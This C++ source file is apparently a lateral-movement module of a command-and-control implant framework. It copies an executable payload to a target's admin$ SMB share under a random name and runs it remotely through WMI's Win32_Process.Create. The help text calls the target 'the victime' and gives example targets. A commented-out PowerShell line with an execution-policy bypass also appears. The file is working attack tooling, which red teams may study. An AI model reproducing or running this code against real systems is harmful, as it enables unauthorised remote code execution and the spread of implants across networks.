#include "WmiExec.hpp"

#include <cstring>
#include  <algorithm>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")
#endif

using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

const std::string moduleName = "wmiExec";


#ifdef _WIN32

__declspec(dllexport) WmiExec* WmiExecConstructor() 
{
    return new WmiExec();
}

BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result);

#endif


WmiExec::WmiExec()
	: ModuleCmd(moduleName)
{
}


WmiExec::~WmiExec()
{
}


std::string WmiExec::getInfo()
{
	std::string info;
	info += "WmiExec:\n";
	info += "Create an exe on an SMB share of the victime and execute it through WMI. \n";
    info += "You must have the right kerberos tickets. \n";
	info += "exemple:\n";
	info += "- wmiExec m3dc.cyber.local /tmp/implant.exe\n";
    info += "- wmiExec 10.9.20.10 /tmp/implant.exe\n";

	return info;
}


int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
   if (splitedCmd.size() >= 3)
	{
		string server = splitedCmd[1];
        string inputFile = splitedCmd[2];

		std::ifstream input(inputFile, std::ios::binary);
		if( input ) 
		{
			std::string buffer(std::istreambuf_iterator<char>(input), {});

			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_inputfile(inputFile);
			c2Message.set_cmd(server);
			c2Message.set_data(buffer.data(), buffer.size());
			}
		else
		{
			c2Message.set_returnvalue("Failed: Couldn't open file.");
			return -1;
		}

	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

#ifdef __linux__ 

#elif _WIN32

#endif

	return 0;
}


std::string randomName( size_t length )
{
    srand(time(NULL));
    auto randchar = []() -> char
    {
        const char charset[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 1);
        return charset[ rand() % max_index ];
    };
    std::string str(length,0);
    std::generate_n( str.begin(), length, randchar );
    return str;
}

// https://learn.microsoft.com/en-us/windows/win32/wmisdk/example--calling-a-provider-method
int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	const std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    splitList(cmd, ";", splitedList);

    std::string server=splitedList[0];
    const std::string data = c2Message.data();

    std::string result;

#ifdef _WIN32

    // transfer payload to remote host
    std::string execName = randomName(8);

    std::string dstPath="\\\\";
    dstPath+=server;
    dstPath+="\\admin$\\";
    dstPath+=execName;
    dstPath+=".exe";

    std::cout << server << std::endl;
    std::cout << dstPath << std::endl;

    BOOL ret=createFileSMB(dstPath, data, result);
    if (!ret) 
    {
        result += "Upload Failed: ";
        result += std::to_string(GetLastError());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    // Execute payload via WMI
    HRESULT hres;

    hres =  CoInitializeEx(0, COINIT_MULTITHREADED); 
    if (FAILED(hres)) 
    {
        result += "CoInitializeEx Failed: ";
        result += std::to_string(GetLastError());
        DeleteFile(dstPath.c_str());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    hres =  CoInitializeSecurity(
        NULL, 
        -1,                          // COM negotiates service
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
        );

    if (FAILED(hres)) 
    {
        result += "CoInitializeSecurity Failed: ";
        result += std::to_string(GetLastError());
        CoUninitialize();
        DeleteFile(dstPath.c_str());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }
    
    IWbemLocator * pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *) &pLoc);
 
    if (FAILED(hres)) 
    {
        result += "CoCreateInstance Failed: ";
        result += std::to_string(GetLastError());
        CoUninitialize();
        DeleteFile(dstPath.c_str());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    std::string wmiPath="\\\\";
    wmiPath+=server;
    wmiPath+="\\root\\CIMV2";

    IWbemServices * pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(wmiPath.c_str()), NULL, NULL, 0, NULL, 0, 0, &pSvc);

    if (FAILED(hres)) 
    {
        result += "ConnectServer Failed: ";
        result += std::to_string(GetLastError());
        pLoc->Release();     
        CoUninitialize();
        DeleteFile(dstPath.c_str());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 
        NULL,                        // Server principal name 
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // client identity
        EOAC_NONE                    // proxy capabilities 
    );

    if (FAILED(hres)) 
    {
        result += "CoSetProxyBlanket Failed: ";
        result += std::to_string(GetLastError());
        pSvc->Release();
        pLoc->Release();     
        CoUninitialize();
        DeleteFile(dstPath.c_str());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    BSTR MethodName = SysAllocString(L"Create");
    BSTR ClassName = SysAllocString(L"Win32_Process");

    IWbemClassObject* pClass = NULL;
    hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);

    IWbemClassObject* pInParamsDefinition = NULL;
    hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);

    IWbemClassObject* pClassInstance = NULL;
    hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

    std::string payloadPath="%SystemRoot%\\";
    payloadPath+=execName;
    payloadPath+=".exe";

    // std::string payloadPath="powershell.exe -NoP -NoL -sta -NonI -Exec Bypass %SystemRoot%\\notepad.exe";

    VARIANT varCommand;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(payloadPath.c_str());

    hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);

    IWbemClassObject* pOutParams = NULL;
    hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);

    if (FAILED(hres))
    {
        result += "CoSetProxyBlanket Failed: ";
        result += std::to_string(GetLastError());

        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release();
        pClassInstance->Release();
        pInParamsDefinition->Release();
        pOutParams->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();    
        DeleteFile(dstPath.c_str());

        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 1;
    }

    VARIANT varReturnValue;
    hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);

    // TODO print output ?

    // Cleanup
    VariantClear(&varCommand);
    VariantClear(&varReturnValue);
    SysFreeString(ClassName);
    SysFreeString(MethodName);
    pClass->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pOutParams->Release();
    pLoc->Release();
    pSvc->Release();
    CoUninitialize();
    DeleteFile(dstPath.c_str());

#elif __linux__

    result += "WmiExec don't work in linux.\n";

#endif

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(result);
	return 0;
}


#ifdef _WIN32 


BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result)
{
    HANDLE hFile = CreateFile(dstPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        result += "CreateFile fail: ";
        result += std::to_string(GetLastError());
        result += "\n";
        return 0;
    }

    DWORD dwBytesWritten = 0;
    BOOL bErrorFlag = WriteFile(hFile, data.data(), data.size(), &dwBytesWritten, NULL);
    if (FALSE == bErrorFlag)
        result += "Unable to write to file\n";

    CloseHandle(hFile);

    return bErrorFlag;
}


#endif
